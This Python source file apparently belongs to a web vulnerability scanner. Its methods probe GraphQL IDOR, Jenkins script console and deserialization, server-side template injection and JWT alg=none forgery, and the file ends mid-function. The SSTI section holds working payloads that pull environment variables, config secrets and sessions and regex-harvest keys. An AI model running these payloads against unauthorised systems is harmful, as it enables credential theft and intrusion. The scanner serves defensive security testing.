#!/usr/bin/env python3
"""
Implementation of Elite Vulnerability Testing Methods

This file contains the actual implementations that will be integrated
into the main VulnerabilityScanner class.
"""

import time
import json
import base64
import hashlib
import re
from typing import List, Optional, Dict, Any
from datetime import datetime
import logging
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode

from asset_manager import VulnerabilityFinding
from .cryptographic_oracle_detector import CryptographicOracleDetector

logger = logging.getLogger(__name__)

async def _test_cryptographic_oracles(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Elite cryptographic oracle detection - CBC padding oracles, JWT vulnerabilities, timing attacks"""
    findings = []
    try:
        oracle_detector = CryptographicOracleDetector()
        crypto_findings = await oracle_detector.detect_cryptographic_oracles(url)
        findings.extend(crypto_findings)
        await oracle_detector.close()

        if crypto_findings:
            logger.info(f"🔐 CRYPTOGRAPHIC ORACLES FOUND: {len(crypto_findings)} on {url}")

    except Exception as e:
        logger.debug(f"Cryptographic oracle detection failed: {e}")

    return findings

async def _test_graphql_idor_exploitation(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """
    Elite GraphQL IDOR exploitation - Far beyond basic IDOR testing

    This tests GraphQL-specific IDOR vulnerabilities including:
    - Introspection-based object enumeration
    - Nested object access bypass
    - Field-level authorization bypass
    - Batch query IDOR
    - Subscription-based IDOR
    """
    findings = []

    try:
        logger.info(f"🔍 Testing GraphQL IDOR exploitation on {url}")

        # First, detect if this is a GraphQL endpoint
        graphql_endpoints = [url, f"{url}/graphql", f"{url}/api/graphql", f"{url}/v1/graphql"]

        for graphql_url in graphql_endpoints:
            # Test GraphQL introspection
            introspection_query = {
                "query": """
                {
                    __schema {
                        types {
                            name
                            fields {
                                name
                                type {
                                    name
                                }
                            }
                        }
                    }
                }
                """
            }

            try:
                headers = await self._get_auth_headers(graphql_url)
                headers['Content-Type'] = 'application/json'

                async with session.post(graphql_url, json=introspection_query, headers=headers, timeout=15) as response:
                    if response.status == 200:
                        introspection_data = await response.json()

                        if 'data' in introspection_data and '__schema' in introspection_data['data']:
                            logger.info(f"🎯 GraphQL endpoint detected: {graphql_url}")

                            # Extract object types that might have IDOR vulnerabilities
                            vulnerable_types = self._extract_idor_vulnerable_types(introspection_data)

                            # Test each vulnerable type
                            for type_name, fields in vulnerable_types.items():
                                idor_findings = await self._test_graphql_type_idor(
                                    graphql_url, session, type_name, fields
                                )
                                findings.extend(idor_findings)

                            # Test batch query IDOR
                            batch_findings = await self._test_graphql_batch_idor(graphql_url, session, vulnerable_types)
                            findings.extend(batch_findings)

            except Exception:
                continue

        # If no introspection available, test common GraphQL IDOR patterns
        if not findings:
            findings.extend(await self._test_blind_graphql_idor(url, session))

    except Exception as e:
        logger.debug(f"GraphQL IDOR exploitation failed: {e}")

    return findings

def _extract_idor_vulnerable_types(self, introspection_data: Dict) -> Dict[str, List[str]]:
    """Extract GraphQL types that might be vulnerable to IDOR"""
    vulnerable_types = {}

    try:
        types = introspection_data['data']['__schema']['types']

        for type_info in types:
            type_name = type_info.get('name', '')
            fields = type_info.get('fields', [])

            # Look for types that represent user data or sensitive objects
            if any(indicator in type_name.lower() for indicator in [
                'user', 'account', 'profile', 'customer', 'order', 'payment',
                'document', 'file', 'message', 'note', 'comment', 'post'
            ]):
                # Extract field names that might contain IDs or sensitive data
                field_names = []
                for field in fields:
                    field_name = field.get('name', '')
                    if field_name and not field_name.startswith('__'):
                        field_names.append(field_name)

                if field_names:
                    vulnerable_types[type_name] = field_names

    except Exception as e:
        logger.debug(f"Failed to extract vulnerable types: {e}")

    return vulnerable_types

async def _test_graphql_type_idor(self, graphql_url: str, session: aiohttp.ClientSession,
                                 type_name: str, fields: List[str]) -> List[VulnerabilityFinding]:
    """Test IDOR vulnerabilities for a specific GraphQL type"""
    findings = []

    try:
        # Test direct object access with different IDs
        test_ids = ['1', '2', '100', '999', 'admin', 'test']

        for test_id in test_ids:
            # Create query to access the object
            query = {
                "query": f"""
                {{
                    {type_name.lower()}(id: "{test_id}") {{
                        {' '.join(fields[:10])}  # Test first 10 fields
                    }}
                }}
                """
            }

            try:
                headers = await self._get_auth_headers(graphql_url)
                headers['Content-Type'] = 'application/json'

                async with session.post(graphql_url, json=query, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        response_data = await response.json()

                        # Check if we got data that we shouldn't have access to
                        if ('data' in response_data and
                            response_data['data'] and
                            type_name.lower() in response_data['data']):

                            data = response_data['data'][type_name.lower()]
                            if data and isinstance(data, dict):
                                # Check for sensitive data patterns
                                sensitive_patterns = [
                                    'email', 'password', 'ssn', 'credit', 'address',
                                    'phone', 'admin', 'secret', 'token', 'key'
                                ]

                                data_str = str(data).lower()
                                if any(pattern in data_str for pattern in sensitive_patterns):
                                    finding = VulnerabilityFinding(
                                        url=graphql_url,
                                        vuln_type="GRAPHQL_IDOR",
                                        severity="High",
                                        confidence=0.85,
                                        payload=f"GraphQL query: {query['query']}",
                                        evidence=f"GraphQL IDOR: Accessed {type_name} object with ID {test_id}",
                                        discovered_at=datetime.now(),
                                        impact_description=f"GraphQL IDOR allows unauthorized access to {type_name} objects",
                                        remediation="Implement field-level authorization in GraphQL resolvers",
                                        affected_parameter=f"{type_name}.id"
                                    )
                                    findings.append(finding)
                                    logger.info(f"🚨 GRAPHQL IDOR: {type_name} accessible with ID {test_id}")

            except Exception:
                continue

    except Exception as e:
        logger.debug(f"GraphQL type IDOR test failed: {e}")

    return findings

async def _test_graphql_batch_idor(self, graphql_url: str, session: aiohttp.ClientSession,
                                  vulnerable_types: Dict[str, List[str]]) -> List[VulnerabilityFinding]:
    """Test batch query IDOR vulnerabilities"""
    findings = []

    try:
        if not vulnerable_types:
            return findings

        # Create batch query to access multiple objects
        type_name = list(vulnerable_types.keys())[0]
        fields = vulnerable_types[type_name]

        batch_query = {
            "query": f"""
            {{
                user1: {type_name.lower()}(id: "1") {{ {' '.join(fields[:5])} }}
                user2: {type_name.lower()}(id: "2") {{ {' '.join(fields[:5])} }}
                user3: {type_name.lower()}(id: "999") {{ {' '.join(fields[:5])} }}
                admin: {type_name.lower()}(id: "admin") {{ {' '.join(fields[:5])} }}
            }}
            """
        }

        headers = await self._get_auth_headers(graphql_url)
        headers['Content-Type'] = 'application/json'

        async with session.post(graphql_url, json=batch_query, headers=headers, timeout=15) as response:
            if response.status == 200:
                response_data = await response.json()

                if 'data' in response_data:
                    # Count how many objects we successfully accessed
                    accessible_objects = 0
                    for key, value in response_data['data'].items():
                        if value and isinstance(value, dict):
                            accessible_objects += 1

                    if accessible_objects >= 2:  # If we can access multiple different objects
                        finding = VulnerabilityFinding(
                            url=graphql_url,
                            vuln_type="GRAPHQL_BATCH_IDOR",
                            severity="High",
                            confidence=0.80,
                            payload=f"Batch GraphQL query accessing {accessible_objects} objects",
                            evidence=f"GraphQL batch query IDOR: Accessed {accessible_objects} different {type_name} objects",
                            discovered_at=datetime.now(),
                            impact_description="GraphQL batch IDOR allows bulk unauthorized access to objects",
                            remediation="Implement rate limiting and authorization for batch GraphQL queries",
                            affected_parameter=f"{type_name}_batch"
                        )
                        findings.append(finding)
                        logger.info(f"🚨 GRAPHQL BATCH IDOR: Accessed {accessible_objects} objects")

    except Exception as e:
        logger.debug(f"GraphQL batch IDOR test failed: {e}")

    return findings

async def _test_blind_graphql_idor(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test common GraphQL IDOR patterns without introspection"""
    findings = []

    try:
        # Common GraphQL object types and queries
        common_queries = [
            {"query": "{ user(id: \"1\") { id email name } }"},
            {"query": "{ users { id email name } }"},
            {"query": "{ profile(id: \"1\") { id email phone } }"},
            {"query": "{ account(id: \"2\") { id username email } }"},
            {"query": "{ order(id: \"1\") { id amount customer } }"},
            {"query": "{ document(id: \"1\") { id content owner } }"},
            {"query": "{ message(id: \"1\") { id body sender } }"},
        ]

        for query in common_queries:
            try:
                headers = await self._get_auth_headers(url)
                headers['Content-Type'] = 'application/json'

                async with session.post(url, json=query, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        try:
                            response_data = await response.json()
                            if ('data' in response_data and
                                response_data['data'] and
                                not response_data.get('errors')):

                                finding = VulnerabilityFinding(
                                    url=url,
                                    vuln_type="GRAPHQL_IDOR",
                                    severity="Medium",
                                    confidence=0.70,
                                    payload=query['query'],
                                    evidence=f"Blind GraphQL IDOR: Query returned data without authorization check",
                                    discovered_at=datetime.now(),
                                    impact_description="GraphQL endpoint allows unauthorized data access",
                                    remediation="Implement proper authorization in GraphQL resolvers",
                                    affected_parameter="graphql_query"
                                )
                                findings.append(finding)
                                logger.info(f"🚨 BLIND GRAPHQL IDOR: Query successful")
                                break  # Found one, that's enough

                        except json.JSONDecodeError:
                            pass

            except Exception:
                continue

    except Exception as e:
        logger.debug(f"Blind GraphQL IDOR test failed: {e}")

    return findings

async def _test_jenkins_rce(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test for Jenkins RCE vulnerabilities"""
    findings = []

    try:
        logger.info(f"🔍 Testing Jenkins RCE vulnerabilities on {url}")

        # Common Jenkins paths
        jenkins_paths = [
            '/jenkins/', '/ci/', '/build/', '/hudson/',
            '/jenkins/script', '/jenkins/manage', '/jenkins/cli'
        ]

        # Jenkins detection patterns
        jenkins_indicators = [
            'Jenkins', 'hudson', 'Build Queue', 'Manage Jenkins',
            'jenkins-session-id', 'X-Jenkins'
        ]

        # Test each path
        for path in jenkins_paths:
            test_url = f"{url.rstrip('/')}{path}"

            try:
                async with session.get(test_url, timeout=10) as response:
                    content = await response.text()
                    headers = dict(response.headers)

                    # Check if this is a Jenkins instance
                    is_jenkins = (
                        any(indicator in content for indicator in jenkins_indicators) or
                        any(indicator in str(headers.values()) for indicator in jenkins_indicators)
                    )

                    if is_jenkins:
                        logger.info(f"🎯 Jenkins instance detected: {test_url}")

                        # Test Script Console RCE
                        script_findings = await self._test_jenkins_script_console(test_url, session)
                        findings.extend(script_findings)

                        # Test CLI RCE
                        cli_findings = await self._test_jenkins_cli_rce(test_url, session)
                        findings.extend(cli_findings)

                        # Test deserialization RCE
                        deser_findings = await self._test_jenkins_deserialization(test_url, session)
                        findings.extend(deser_findings)

            except Exception:
                continue

        # Test for Jenkins on common ports
        parsed = urlparse(url)
        if parsed.port != 8080:  # If not already testing port 8080
            jenkins_url = f"{parsed.scheme}://{parsed.hostname}:8080/"
            jenkins_findings = await self._test_jenkins_rce(jenkins_url, session)
            findings.extend(jenkins_findings)

    except Exception as e:
        logger.debug(f"Jenkins RCE test failed: {e}")

    return findings

async def _test_jenkins_script_console(self, jenkins_url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test Jenkins Script Console for RCE"""
    findings = []

    try:
        script_console_url = f"{jenkins_url.rstrip('/')}/script"

        # Test if script console is accessible
        async with session.get(script_console_url, timeout=10) as response:
            if response.status == 200:
                content = await response.text()

                if 'Script Console' in content or 'groovy' in content.lower():
                    # Try to execute a safe test command
                    test_script = 'println("jenkins_rce_test_" + new Date().getTime())'

                    form_data = {
                        'script': test_script,
                        'Submit': 'Run'
                    }

                    async with session.post(script_console_url, data=form_data, timeout=10) as exec_response:
                        if exec_response.status == 200:
                            exec_content = await exec_response.text()

                            if 'jenkins_rce_test_' in exec_content:
                                finding = VulnerabilityFinding(
                                    url=script_console_url,
                                    vuln_type="JENKINS_RCE",
                                    severity="Critical",
                                    confidence=0.95,
                                    payload=test_script,
                                    evidence="Jenkins Script Console allows arbitrary code execution",
                                    discovered_at=datetime.now(),
                                    impact_description="Jenkins Script Console enables remote code execution",
                                    remediation="Restrict access to Jenkins Script Console and implement authentication",
                                    affected_parameter="script"
                                )
                                findings.append(finding)
                                logger.info(f"🚨 JENKINS SCRIPT CONSOLE RCE: {script_console_url}")

    except Exception as e:
        logger.debug(f"Jenkins script console test failed: {e}")

    return findings

async def _test_jenkins_cli_rce(self, jenkins_url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test Jenkins CLI for RCE vulnerabilities"""
    findings = []

    try:
        cli_url = f"{jenkins_url.rstrip('/')}/cli"

        async with session.get(cli_url, timeout=10) as response:
            if response.status == 200:
                content = await response.text()

                if 'Jenkins CLI' in content or 'jenkins-cli.jar' in content:
                    # Test for CLI command injection
                    cli_commands = [
                        'help',
                        'version',
                        'who-am-i'
                    ]

                    for command in cli_commands:
                        try:
                            # Test CLI command execution
                            cli_data = {'command': command}

                            async with session.post(cli_url, data=cli_data, timeout=10) as cli_response:
                                if cli_response.status == 200:
                                    cli_content = await cli_response.text()

                                    # Look for successful command execution
                                    if any(indicator in cli_content for indicator in [
                                        'Jenkins', 'version', 'authenticated', 'anonymous'
                                    ]):
                                        finding = VulnerabilityFinding(
                                            url=cli_url,
                                            vuln_type="JENKINS_CLI_RCE",
                                            severity="High",
                                            confidence=0.80,
                                            payload=f"CLI command: {command}",
                                            evidence=f"Jenkins CLI allows command execution: {command}",
                                            discovered_at=datetime.now(),
                                            impact_description="Jenkins CLI allows unauthorized command execution",
                                            remediation="Secure Jenkins CLI access and implement proper authentication",
                                            affected_parameter="cli_command"
                                        )
                                        findings.append(finding)
                                        logger.info(f"🚨 JENKINS CLI RCE: Command {command} executed")
                                        break

                        except Exception:
                            continue

    except Exception as e:
        logger.debug(f"Jenkins CLI test failed: {e}")

    return findings

async def _test_jenkins_deserialization(self, jenkins_url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test Jenkins for Java deserialization RCE"""
    findings = []

    try:
        # Jenkins often has deserialization endpoints
        deser_endpoints = [
            '/cli',
            '/computer/(master)/slave-agent.jnlp',
            '/tcpSlaveAgentListener/',
            '/manage'
        ]

        for endpoint in deser_endpoints:
            test_url = f"{jenkins_url.rstrip('/')}{endpoint}"

            try:
                # Test with serialized Java object
                java_payload = b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01t\x00\x04testt\x00\x07jenkins'

                headers = {
                    'Content-Type': 'application/x-java-serialized-object'
                }

                async with session.post(test_url, data=java_payload, headers=headers, timeout=15) as response:
                    content = await response.text()

                    # Look for deserialization errors that indicate vulnerability
                    deser_errors = [
                        'ClassNotFoundException',
                        'StreamCorruptedException',
                        'InvalidClassException',
                        'OptionalDataException'
                    ]

                    if any(error in content for error in deser_errors):
                        finding = VulnerabilityFinding(
                            url=test_url,
                            vuln_type="JENKINS_DESERIALIZATION_RCE",
                            severity="Critical",
                            confidence=0.85,
                            payload="Java serialized object",
                            evidence=f"Jenkins deserialization vulnerability at {endpoint}",
                            discovered_at=datetime.now(),
                            impact_description="Jenkins deserialization vulnerability allows remote code execution",
                            remediation="Update Jenkins and disable unsafe deserialization",
                            affected_parameter="serialized_data"
                        )
                        findings.append(finding)
                        logger.info(f"🚨 JENKINS DESERIALIZATION: {endpoint}")

            except Exception:
                continue

    except Exception as e:
        logger.debug(f"Jenkins deserialization test failed: {e}")

    return findings

async def _test_ssti_with_credentials(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test SSTI exploitation combined with credential discovery"""
    findings = []

    try:
        logger.info(f"🔍 Testing SSTI with credential integration on {url}")

        # First, test for basic SSTI
        ssti_payloads = [
            # Jinja2 (Python Flask/Django)
            '{{7*7}}', '{{config}}', '{{request}}', '{{session}}',
            '{{config.SECRET_KEY}}', '{{request.environ}}',

            # Twig (PHP Symfony)
            '{{7*7}}', '{{app}}', '{{app.request}}', '{{app.session}}',
            '{{_self.env.getGlobals()}}',

            # Smarty (PHP)
            '{$smarty.version}', '{$smarty.config}',

            # Freemarker (Java)
            '${7*7}', '${.vars}', '${"freemarker.template.utility.Execute"?new()}',

            # Thymeleaf (Java Spring)
            '${7*7}', '${T(java.lang.System).getProperty("user.dir")}',

            # Handlebars (Node.js)
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}',

            # Velocity (Java)
            '#set($x=7*7)$x', '$class.inspect($class.type)',

            # Mustache
            '{{#lambda}}{{7*7}}{{/lambda}}',
        ]

        # Test SSTI in URL parameters
        for payload in ssti_payloads:
            try:
                test_url = f"{url}?name={payload}&template={payload}"

                async with session.get(test_url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()

                        # Check for successful template evaluation
                        if self._detect_ssti_success(payload, content):
                            # Found SSTI, now try to exploit for credentials
                            cred_findings = await self._exploit_ssti_for_credentials(
                                url, session, payload, self._detect_template_engine(payload, content)
                            )
                            findings.extend(cred_findings)

            except Exception:
                continue

        # Test SSTI in forms
        try:
            async with session.get(url) as response:
                content = await response.text()

            from .universal_form_parser import parse_forms
            forms = parse_forms(content, base_url=url)

            for form in forms[:3]:  # Test first 3 forms
                action_url = form.get('action', url)
                method = form.get('method', 'GET').upper()
                input_fields = form.get('inputs', {})

                if input_fields:
                    for field_name in input_fields.keys():
                        form_ssti_findings = await self._test_form_ssti_credentials(
                            action_url, method, field_name, ssti_payloads, session
                        )
                        findings.extend(form_ssti_findings)

        except Exception:
            pass

    except Exception as e:
        logger.debug(f"SSTI with credentials test failed: {e}")

    return findings

def _detect_ssti_success(self, payload: str, content: str) -> bool:
    """Detect if SSTI payload was successfully executed"""
    success_indicators = {
        '{{7*7}}': '49',
        '${7*7}': '49',
        '#set($x=7*7)$x': '49',
        '{{config}}': '<Config',
        '{{app}}': 'Application',
        '${.vars}': 'SimpleHash',
        '$class.inspect': 'class',
        '{{request}}': 'Request',
        '{{session}}': 'Session'
    }

    for test_payload, expected_result in success_indicators.items():
        if test_payload in payload and expected_result in content:
            return True

    return False

def _detect_template_engine(self, payload: str, content: str) -> str:
    """Detect which template engine is being used"""
    if '{{' in payload and ('Flask' in content or 'Jinja' in content or 'config' in content):
        return 'jinja2'
    elif '{{' in payload and ('Twig' in content or 'app' in content):
        return 'twig'
    elif '${' in payload and ('freemarker' in content.lower() or 'FreeMarker' in content):
        return 'freemarker'
    elif '${' in payload and ('thymeleaf' in content.lower() or 'Spring' in content):
        return 'thymeleaf'
    elif '#set' in payload:
        return 'velocity'
    elif '{$smarty' in payload:
        return 'smarty'
    else:
        return 'unknown'

async def _exploit_ssti_for_credentials(self, url: str, session: aiohttp.ClientSession,
                                      successful_payload: str, template_engine: str) -> List[VulnerabilityFinding]:
    """Exploit SSTI to extract credentials and sensitive information"""
    findings = []

    try:
        # Template engine specific credential extraction payloads
        credential_payloads = {
            'jinja2': [
                '{{config.SECRET_KEY}}',
                '{{config.DATABASE_URL}}',
                '{{config.SQLALCHEMY_DATABASE_URI}}',
                '{{request.environ}}',
                '{{session}}',
                '{{g}}',
                "{{config.__class__.__init__.__globals__['os'].environ}}",
                "{{config.items()}}"
            ],
            'twig': [
                '{{app.request.server.all|join(",")}}',
                '{{app.session.all}}',
                '{{app.request.cookies.all}}',
                '{{_self.env.getGlobals()}}',
                '{{app.security.token}}',
                '{{app.user}}'
            ],
            'freemarker': [
                '${.vars}',
                '${"freemarker.template.utility.ObjectConstructor"?new().newInstance("java.lang.ProcessBuilder","env").start().waitFor()}',
                '${.data_model}',
                '${.globals}',
                '${.main}'
            ],
            'thymeleaf': [
                '${T(java.lang.System).getProperties()}',
                '${T(java.lang.System).getenv()}',
                '${session}',
                '${application}',
                '${#request.session}',
                '${#servletContext}'
            ],
            'velocity': [
                '$class.inspect($class.type)',
                '#set($env = $class.forName("java.lang.System").getenv())$env',
                '#set($props = $class.forName("java.lang.System").getProperties())$props',
                '$request.session',
                '$request.getSession()'
            ]
        }

        if template_engine in credential_payloads:
            for cred_payload in credential_payloads[template_engine]:
                try:
                    test_url = f"{url}?name={cred_payload}"

                    async with session.get(test_url, timeout=15) as response:
                        if response.status == 200:
                            content = await response.text()

                            # Look for sensitive information in the response
                            sensitive_patterns = [
                                r'password["\']:\s*["\'][^"\']+["\']',
                                r'secret["\']:\s*["\'][^"\']+["\']',
                                r'key["\']:\s*["\'][^"\']+["\']',
                                r'token["\']:\s*["\'][^"\']+["\']',
                                r'api[_-]?key["\']:\s*["\'][^"\']+["\']',
                                r'database[_-]?url["\']:\s*["\'][^"\']+["\']',
                                r'mysql://[^"\'<>\s]+',
                                r'postgresql://[^"\'<>\s]+',
                                r'mongodb://[^"\'<>\s]+',
                                r'redis://[^"\'<>\s]+',
                                r'AKIA[0-9A-Z]{16}',  # AWS Access Key
                                r'[0-9a-f]{32}',  # Potential secret keys
                            ]

                            extracted_secrets = []
                            for pattern in sensitive_patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                extracted_secrets.extend(matches)

                            if extracted_secrets:
                                finding = VulnerabilityFinding(
                                    url=test_url,
                                    vuln_type="SSTI_CREDENTIAL_EXPOSURE",
                                    severity="Critical",
                                    confidence=0.90,
                                    payload=cred_payload,
                                    evidence=f"SSTI credential extraction successful. Found: {extracted_secrets[:3]}",
                                    discovered_at=datetime.now(),
                                    impact_description=f"SSTI in {template_engine} allows extraction of sensitive credentials",
                                    remediation="Sanitize template input and restrict template access to sensitive variables",
                                    affected_parameter="template_variable"
                                )
                                findings.append(finding)
                                logger.info(f"🚨 SSTI CREDENTIAL EXPOSURE: Found {len(extracted_secrets)} secrets")

                            # Also check for configuration exposure
                            config_indicators = [
                                'SECRET_KEY', 'DATABASE_URL', 'SQLALCHEMY_',
                                'AWS_', 'API_KEY', 'PASSWORD', 'TOKEN'
                            ]

                            if any(indicator in content.upper() for indicator in config_indicators):
                                finding = VulnerabilityFinding(
                                    url=test_url,
                                    vuln_type="SSTI_CONFIG_EXPOSURE",
                                    severity="High",
                                    confidence=0.85,
                                    payload=cred_payload,
                                    evidence=f"SSTI exposes application configuration via {template_engine}",
                                    discovered_at=datetime.now(),
                                    impact_description="SSTI allows access to sensitive application configuration",
                                    remediation="Restrict template access to configuration variables",
                                    affected_parameter="template_config"
                                )
                                findings.append(finding)
                                logger.info(f"🚨 SSTI CONFIG EXPOSURE via {template_engine}")

                except Exception:
                    continue

    except Exception as e:
        logger.debug(f"SSTI credential exploitation failed: {e}")

    return findings

async def _test_form_ssti_credentials(self, action_url: str, method: str, field_name: str,
                                    ssti_payloads: List[str], session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test SSTI in form fields and exploit for credentials"""
    findings = []

    try:
        for payload in ssti_payloads[:5]:  # Test first 5 payloads
            try:
                form_data = {field_name: payload}

                if method == 'POST':
                    async with session.post(action_url, data=form_data, timeout=10) as response:
                        content = await response.text()
                else:
                    params = urlencode(form_data)
                    test_url = f"{action_url}?{params}"
                    async with session.get(test_url, timeout=10) as response:
                        content = await response.text()

                if self._detect_ssti_success(payload, content):
                    template_engine = self._detect_template_engine(payload, content)
                    cred_findings = await self._exploit_ssti_for_credentials(
                        action_url, session, payload, template_engine
                    )
                    findings.extend(cred_findings)
                    break  # Found SSTI, move to next field

            except Exception:
                continue

    except Exception:
        pass

    return findings

async def _test_nodejs_jose_vulnerabilities(self, url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test for Node.js JOSE (JSON Object Signing and Encryption) vulnerabilities"""
    findings = []

    try:
        logger.info(f"🔍 Testing Node.js JOSE vulnerabilities on {url}")

        # First, look for Node.js indicators
        async with session.get(url, timeout=10) as response:
            content = await response.text()
            headers = dict(response.headers)

            # Check if this is a Node.js application
            nodejs_indicators = [
                'x-powered-by' in headers and 'express' in headers['x-powered-by'].lower(),
                'server' in headers and 'node' in headers['server'].lower(),
                'connect.sid' in str(response.cookies),
                'express:' in content.lower(),
                'node.js' in content.lower()
            ]

            if not any(nodejs_indicators):
                return findings  # Not a Node.js app

        # Look for JOSE tokens in the response
        jose_tokens = self._extract_jose_tokens(content, headers, response.cookies)

        for token_location, token in jose_tokens:
            # Test various JOSE vulnerabilities
            jose_findings = await self._test_jose_token_vulnerabilities(url, session, token, token_location)
            findings.extend(jose_findings)

        # Test common Node.js JOSE endpoints
        jose_endpoints = [
            '/auth/token', '/api/auth', '/login', '/oauth/token',
            '/api/v1/auth', '/auth/jwt', '/token', '/jwt'
        ]

        for endpoint in jose_endpoints:
            test_url = f"{url.rstrip('/')}{endpoint}"
            endpoint_findings = await self._test_jose_endpoint(test_url, session)
            findings.extend(endpoint_findings)

    except Exception as e:
        logger.debug(f"Node.js JOSE test failed: {e}")

    return findings

def _extract_jose_tokens(self, content: str, headers: Dict[str, str], cookies: Any) -> List[tuple]:
    """Extract potential JOSE tokens from response"""
    tokens = []

    # JOSE token pattern (JWE: 5 parts, JWS: 3 parts)
    jose_pattern = r'eyJ[A-Za-z0-9_-]+\.(?:eyJ[A-Za-z0-9_-]+\.)?[A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+){1,2}'

    # Check content
    content_tokens = re.findall(jose_pattern, content)
    for token in content_tokens:
        tokens.append(("response_body", token))

    # Check headers
    auth_headers = ['Authorization', 'X-Auth-Token', 'X-Access-Token', 'X-JWT-Token']
    for header_name in auth_headers:
        if header_name in headers:
            header_value = headers[header_name]
            if 'Bearer ' in header_value:
                token = header_value.replace('Bearer ', '')
                if re.match(jose_pattern, token):
                    tokens.append((f"header_{header_name}", token))

    # Check cookies
    for cookie in cookies:
        if re.match(jose_pattern, cookie.value):
            tokens.append((f"cookie_{cookie.key}", cookie.value))

    return tokens

async def _test_jose_token_vulnerabilities(self, url: str, session: aiohttp.ClientSession,
                                         token: str, token_location: str) -> List[VulnerabilityFinding]:
    """Test JOSE token for various vulnerabilities"""
    findings = []

    try:
        # Parse JOSE token
        parts = token.split('.')

        if len(parts) == 3:  # JWS (JSON Web Signature)
            findings.extend(await self._test_jws_vulnerabilities(url, session, token, token_location, parts))
        elif len(parts) == 5:  # JWE (JSON Web Encryption)
            findings.extend(await self._test_jwe_vulnerabilities(url, session, token, token_location, parts))

    except Exception as e:
        logger.debug(f"JOSE token analysis failed: {e}")

    return findings

async def _test_jws_vulnerabilities(self, url: str, session: aiohttp.ClientSession,
                                  token: str, token_location: str, parts: List[str]) -> List[VulnerabilityFinding]:
    """Test JWS (JSON Web Signature) vulnerabilities"""
    findings = []

    try:
        # Decode header and payload
        header_data = self._decode_jwt_part(parts[0])
        payload_data = self._decode_jwt_part(parts[1])

        if not header_data or not payload_data:
            return findings

        # Test algorithm confusion (alg=none)
        none_vuln = await self._test_jose_alg_none(url, session, token_location, header_data, payload_data)
        if none_vuln:
            findings.append(none_vuln)

        # Test algorithm substitution (RS256 -> HS256)
        if header_data.get('alg') == 'RS256':
            sub_vuln = await self._test_jose_algorithm_substitution(url, session, token_location, header_data, payload_data)
            if sub_vuln:
                findings.append(sub_vuln)

        # Test critical header bypass
        if 'crit' in header_data:
            crit_vuln = await self._test_jose_critical_bypass(url, session, token_location, header_data, payload_data)
            if crit_vuln:
                findings.append(crit_vuln)

        # Test embedded JWK attacks
        if 'jwk' in header_data:
            jwk_vuln = await self._test_jose_embedded_jwk(url, session, token_location, header_data, payload_data)
            if jwk_vuln:
                findings.append(jwk_vuln)

    except Exception as e:
        logger.debug(f"JWS vulnerability test failed: {e}")

    return findings

async def _test_jwe_vulnerabilities(self, url: str, session: aiohttp.ClientSession,
                                  token: str, token_location: str, parts: List[str]) -> List[VulnerabilityFinding]:
    """Test JWE (JSON Web Encryption) vulnerabilities"""
    findings = []

    try:
        # Decode JWE header
        header_data = self._decode_jwt_part(parts[0])

        if not header_data:
            return findings

        # Test key confusion attacks
        if header_data.get('alg') in ['RSA1_5', 'RSA-OAEP']:
            key_confusion_vuln = await self._test_jwe_key_confusion(url, session, token_location, parts)
            if key_confusion_vuln:
                findings.append(key_confusion_vuln)

        # Test invalid curve attacks
        if header_data.get('alg', '').startswith('ECDH'):
            curve_vuln = await self._test_jwe_invalid_curve(url, session, token_location, parts)
            if curve_vuln:
                findings.append(curve_vuln)

    except Exception as e:
        logger.debug(f"JWE vulnerability test failed: {e}")

    return findings

def _decode_jwt_part(self, part: str) -> Optional[Dict]:
    """Decode JWT/JOSE header or payload"""
    try:
        # Add padding if missing
        padded = part + '=' * (4 - len(part) % 4)
        decoded = base64.urlsafe_b64decode(padded)
        return json.loads(decoded.decode('utf-8'))
    except:
        return None

async def _test_jose_alg_none(self, url: str, session: aiohttp.ClientSession,
                            token_location: str, header_data: Dict, payload_data: Dict) -> Optional[VulnerabilityFinding]:
    """Test JOSE algorithm confusion (alg=none)"""
    try:
        # Create modified header with alg=none
        modified_header = header_data.copy()
        modified_header['alg'] = 'none'

        # Encode modified JOSE token
        header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')

        # Create token with no signature
        modified_token = f"{header_b64}.{payload_b64}."

        # Test if server accepts the modified token
        if await self._test_modified_jose_token(modified_token, url, session, token_location):
            return VulnerabilityFinding(
                url=url,
                vuln_type="JOSE_ALG_NONE",
                severity="Critical",
                confidence=0.95,
                payload=f"Modified JOSE with alg=none: {modified_token}",
                evidence=f"Server accepts JOSE tokens with alg=none in {token_location}",
                discovered_at=datetime.now(),
                impact_description="JOSE algorithm confusion allows token forgery without secret",
                remediation="Explicitly validate JOSE algorithm and reject alg=none",
                affected_parameter=token_location
            )

    except Exception as e:
        logger.debug(f"JOSE alg=none test failed: {e}")

    return None

async def _test_jose_algorithm_substitution(self, url: str, session: aiohttp.ClientSession,
                                          token_location: str, header_data: Dict, payload_data: Dict) -> Optional[VulnerabilityFinding]:
    """Test JOSE algorithm substitution (RS256 -> HS256)"""
    try:
        # Change algorithm from RS256 to HS256
        modified_header = header_data.copy()
